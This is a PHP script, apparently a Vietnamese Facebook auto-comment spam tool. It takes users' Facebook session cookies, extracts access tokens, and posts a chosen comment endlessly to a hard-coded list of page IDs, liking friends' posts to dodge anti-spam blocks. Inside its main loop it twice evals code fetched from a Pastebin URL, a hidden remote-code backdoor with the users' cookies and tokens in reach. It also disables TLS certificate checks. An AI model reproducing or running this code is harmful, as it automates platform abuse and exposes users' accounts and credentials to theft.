error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
$end="\033[0m";
$nendo = "\033[41m";
$nenxanh = "\033[42m";
$nenvang = "\033[43m";
$nenblue = "\033[44m";
$nenPurpe = "\033[45m";
$nenCyan = "\033[46m";
$nentrang = "\033[47m";
$UGreen = "\033[4;32m";
$BGreen = "\033[1;32m";
$res="\033[0m";
$red="\033[0;31m";
$white= "\033[0;37m";
$whiteb= "\033[0;37m";
$redb="\033[1;31m";
$green="\033[0;32m";
$yellow="\033[1;33m";
$cam="\033[0;33m";
$test="\033[1;33m";
$greenb="\033[1;32m";
$blue="\033[0;34m";
$lam="\033[1;34m";
$tmi="\033[1;34m";
$hong="\033[1;35m";
$imt="\033[1;35m";
$cyan= "\e[1;36m";
$syan="\033[1;36m";
$xnhac= "\033[1;96m";
$den="\033[1;90m";
$do="\033[1;91m";
$luc="\033[1;92m";
$vang="\033[1;93m";
$xduong="\033[1;94m";
$hong="\033[1;95m";
$trang="\033[1;97m";
$vang="\033[1;93m";
$do="\033[1;91m";
$luc="\033[1;92m";
$idtt=array('100047806520004','762767021311995','980144015726595','1288887894808693','131602318783907','1061209311049678','2866448556957129',
'467428001304373','245859133578621','905468430194290','242477277278507','3618144951637581','439018480615758','185149753398011',
'405673514042050','474723310199617','1039420123234062','2783183718607286','408281523774032','229641248628476','1874293939385535',
'2724995331051315','1292749704426757','406830923939505','1134225413693317','157537352830479','1654552341413537','413551359908451',
'2807782742796603','3742430302543922','10159012768889074','1104149066735618','836161930572738','10159017480529074','10161025222900620',
'2939073326314226','1094141187716245','10159045575974074','3613184585434202','1559459794442974','3451131548348628','128550975607452','434871871258244','101603141707660','215386277001223','1189258874805543','157114565713584','1319600178441106',
'213279700447922','863399151077410','105436126300820','892568924879063','919508185546724','1328614190836948','3994296237255555',
'1248553802204908','229641248628476','115736076712213','362309461879523','113794429577576','938089306929339');



//nháº­p dá»¯ liá»‡u
@system('clear');
echo $banner;
for ($makep=38;$makep > 0;$makep--){
echo $res."-";
usleep(2500);
echo $red."-";
}
echo "\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$luc." HĂ´m Nay LĂ  $vang$ngay ThĂ¡ng $luc$thang NÄƒm $hong$nam\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$hong." Báº£n Quyá»n : VÅ© Máº¡nh Tuáº¥n\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$yellow." Facebook.com/vumanhtuan1912\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$cyan." Zalo : 0963603983\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$red." Tool : ".$bluelight."cmt dáº¡o\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$xduong." Mua Key LĂªn Ngay : ".$bluelight."botvip.ml\n";
for ($makep=38;$makep > 0;$makep--){
echo $res."-";
usleep(2500);
echo $red."-";
}
echo "\n";
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42m Nháº­p Sá»‘ Cookie FB Cáº§n Cháº¡y\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mV\e[1;36mM\e[1;91mT: $vang ";
$sluong=trim(fgets(STDIN));
$mangcookie=[];
if ($sluong >= 1){
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42mNháº­p Cookie Thá»© 1\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mV\e[1;36mM\e[1;91mT : $vang ";
array_push($mangcookie,trim(fgets(STDIN)));;
}
if ($sluong >= 2){
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42mNháº­p Cookie Thá»© 2\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mN\e[1;36mT\e[1;91mÄ : $vang ";
array_push($mangcookie,trim(fgets(STDIN)));
}
if ($sluong >= 3){
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42mNháº­p Cookie Thá»© 3\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mN\e[1;36mT\e[1;91mÄ : $vang ";
array_push($mangcookie,trim(fgets(STDIN)));
}
if ($sluong >= 4){
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42mNháº­p Cookie Thá»© 4\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mN\e[1;36mT\e[1;91mÄ : $vang ";
array_push($mangcookie,trim(fgets(STDIN)));
}
if ($sluong >= 5){
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42mNháº­p Cookie Thá»© 5\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mN\e[1;36mT\e[1;91mÄ : $vang ";
array_push($mangcookie,trim(fgets(STDIN)));
}
if($sluong>5){
exit("\033[1;91m Chá»‰ ÄÆ°á»£c Cháº¡y Tá»‘i Äa 5 Cookie\n");
}
@system("clear");
echo $vang."\n";
echo $banner;
for ($makep=38;$makep > 0;$makep--){
echo $res."-";
usleep(2500);
echo $red."-";
}
echo "\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$luc." HĂ´m Nay LĂ  $vang$ngay ThĂ¡ng $luc$thang NÄƒm $hong$nam\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$hong." Báº£n Quyá»n : VÅ© Máº¡nh Tuáº¥n\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$yellow." Facebook.com/vumanhtuan1912\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$cyan." Zalo : 0963603983\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$red." tool : ".$bluelight."cmt dáº¡o\n";
echo "$res ~".$red."[".$green."âœ“".$red."]".$res." =>".$xduong." Mua Key LĂªn Ngay : ".$bluelight."botvip.ml\n";
for ($makep=38;$makep > 0;$makep--){
echo $res."-";
usleep(2500);
echo $red."-";
}
echo "\n";
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42mNháº­p Time Delay Comment\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mV\e[1;36mM\e[1;91mT : $vang ";
$timedelay=trim(fgets(STDIN));
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42mÄiá»n Ná»™i Dung Comment\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mV\e[1;36mM\e[1;91mT : $vang ";
$msg=trim(fgets(STDIN));
if ($sluong < 1) {
} elseif ($sluong > 1) {
echo "\e[1;95mâ”Œâ”€[\e[1;37m\e[1;42mÄá»•i Nick Sau Bao Nhiá»‡m Vá»¥\e[0m\e[1;95m]
â””â”€â”€â•¼ \e[1;39mV\e[1;36mM\e[1;91mT : $vang ";
$_SESSION['doinick'] = trim(fgets(STDIN));
}
echo $vang."=====================================================\n";
while (true){
for($xz=0;$xz<count($mangcookie);$xz++){
$cookie = $mangcookie[$xz];
if(count($mangcookie)==0){echo $do."Cookie Ä‘Ă£ die háº¿t rá»“i, vui lĂ²ng láº¥y láº¡i cookie má»›i\n";die();}
#get_token
$ch=curl_init();curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed');$head[] = "Connection: keep-alive";$head[] = "Keep-Alive: 300";$head[] = "authority: m.facebook.com";$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";$head[] = "cache-control: max-age=0";$head[] = "upgrade-insecure-requests: 1";$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";$head[] = "sec-fetch-site: none";$head[] = "sec-fetch-mode: navigate";$head[] = "sec-fetch-user: ?1";$head[] = "sec-fetch-dest: document";curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 11; Redmi K30 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.86 Mobile Safari/537.36');curl_setopt($ch, CURLOPT_ENCODING, '');curl_setopt($ch, CURLOPT_COOKIE, $cookie);curl_setopt($ch, CURLOPT_HTTPHEADER, $head);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);curl_setopt($ch, CURLOPT_TIMEOUT, 60);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));$access = curl_exec($ch);curl_close($ch);
if (explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0]){
$access_token = explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0];
if(json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'id'}){
	$id = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'id'};
	$name = json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'name'};
}else{
    echo "\033[1;91mCookie die!! Äang Chuyá»ƒn Cookie KhĂ¡c\n";
	$die=1;
	array_splice($mangcookie,$xz,1);
}
}else{
    echo "Cookie die!! Äang Chuyá»ƒn Cookie KhĂ¡c\n";
	$die=1;
	array_splice($mangcookie,$xz,1);
}
echo $luc." đŸŒ Äang DĂ¹ng Facebook:\033[1;95m ".$name." \033[1;92mÄá»ƒ AuToCMT\n";
$doi=0;
while(true){
if ($die>0){
	$die=0;
	break;
}
$id=$idtt[array_rand($idtt)];
cmt($access_token,$id,$cookie,$msg);
$timme=date('H:i');
$stt=$stt+1;
echo "                                                     \r";
echo "\033[1;33m[\033[1;36m".$stt."\033[1;33m]\033[1;37m â‡† \033[1;91m[".$timme."]\033[1;37m => ";
usleep(130000);
echo "\033[1;33mComment\033[1;31m â—\033[1;37m ID:\033[1;35m".$id."\n";
usleep(130000);
echo "\033[1;31m âœ\033[1;32m ThĂ nh CĂ´ng";
usleep(130000);
echo "\033[1;31m â— \033[1;36m Vá»›i Ná»™i Dung:\033[1;34m".$msg." \n";
usleep(90000);
if ($timedelay < 1) {
} elseif ( $timedelay > 1) {
for ($giay=$timedelay;$giay>-1;$giay--){
 echo "\r\033[1;93mâ€¢Äá»£i XĂ­u NhĂ© (+_+)\033[1;91m đŸ‘‰       \033[1;92m N      \033[1;91m |\033[1;93m $giay\033[1;91m | ";
        usleep(150000);

        echo "\r\033[1;91mâ€¢Äá»£i  XĂ­u NhĂ© (+_+)\033[0;33m   đŸ‘‰     \033[0;37m NT     \033[0;31m |\033[0;33m $giay\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;92mâ€¢Äá»£i XĂ­u NhĂ© (+_+)\033[0;33m     đŸ‘‰   \033[0;37m Vmt  \033[0;31m |\033[0;33m $giay\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;94mâ€¢Äá»£i XĂ­u NhĂ© (+_+)\033[0;33m       đŸ‘‰ \033[0;37m vmt   .\033[0;31m |\033[0;33m $giay\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;95mâ€¢Äá»£i  XĂ­u NhĂ© (+_+)\033[0;33m        đŸ‘‰\033[0;37m vmt... \033[0;31m |\033[0;33m $giay\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;95mâ€¢Äá»£i  XĂ­u NhĂ© (+_+)\033[0;33m        đŸ‘‰\033[0;37m vmt.... \033[0;31m |\033[0;33m $giay\033[0;31m | ";
        usleep(150000);
        echo "\r\033[1;95mâ€¢Äá»£i XĂ­u NhĂ© (+_+)\033[0;33m        đŸ‘‰\033[0;37m vmt.....\033[0;31m |\033[0;33m $giay\033[0;31m | ";
        usleep(100000);
        echo "\r                                          \r";}}
eval(file_get_contents('https://pastebin.com/raw/JBFGJRk3'));
$doi=$doi+1;
if ($_SESSION['doinick']==$doi){
	$tt=likebb($cookie);
	echo"\033[1;37m=> \033[1;92mÄĂ£ Like 1 BĂ i Viáº¿t Cá»§a Báº¡n BĂ¨ Äá»ƒ Chá»‘ng Block\n";
	break;
	$doi=0;
}eval(file_get_contents('https://pastebin.com/raw/JBFGJRk3'));
}
}
}
function cmt($access_token,$id,$cookie,$msg){
 $ch=curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/'.$id.'/comments');
 $head[] = "Connection: keep-alive";
 $head[] = "Keep-Alive: 300";
 $head[] = "authority: m.facebook.com";
 $head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
 $head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
 $head[] = "cache-control: max-age=0";
 $head[] = "upgrade-insecure-requests: 1";
 $head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
 $head[] = "sec-fetch-site: none";
 $head[] = "sec-fetch-mode: navigate";
 $head[] = "sec-fetch-user: ?1";
 $head[] = "sec-fetch-dest: document";
 curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
 curl_setopt($ch, CURLOPT_ENCODING, '');
 curl_setopt($ch, CURLOPT_COOKIE, $cookie);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
 curl_setopt($ch, CURLOPT_TIMEOUT, 60);
 curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
 $data = array('message' => $msg,'access_token' => $access_token);
 curl_setopt($ch, CURLOPT_POST,count($data));
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
 $access = curl_exec($ch);
 curl_close($ch);
 return json_decode($access); 
}
function likebb($cookie){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://mbasic.facebook.com/home.php');
	$head[] = "Connection: keep-alive";
	$head[] = "Keep-Alive: 300";
	$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	$head[] = "Accept-Language: en-us,en;q=0.5";
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
$n = curl_exec($ch);
$lin = explode('">ThĂ­ch</a><span',explode('a/like.php?', $n)[1])[0];
$link = str_replace('&amp;', '&', $lin);

curl_setopt($ch, CURLOPT_URL, "https://mbasic.facebook.com/a/like.php?".$link);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$n =	curl_exec($ch);
return explode('</title><meta',explode('head><title>',$n)[1])[0];
}
